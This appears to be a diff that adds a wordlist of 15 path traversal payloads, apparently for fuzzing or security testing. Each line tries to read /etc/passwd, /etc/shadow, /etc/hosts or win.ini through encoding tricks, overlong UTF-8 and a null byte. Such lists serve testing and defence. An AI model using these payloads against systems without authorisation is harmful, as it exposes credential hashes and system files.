@@ -1,0 +1,15 @@
+../../../etc/passwd
+..%2F..%2F..%2Fetc%2Fpasswd
+....//....//....//etc/passwd
+..\/..\/..\/etc/passwd
+..%252f..%252f..%252fetc%252fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%c0%af..%c0%af..%c0%afetc/passwd
+../../../etc/shadow
+../../../etc/hosts
+../../../windows/win.ini
+..\..\..\..\windows\win.ini
+....\\....\\....\\windows\\win.ini
+/etc/passwd
+/etc/shadow
+..%00/etc/passwd
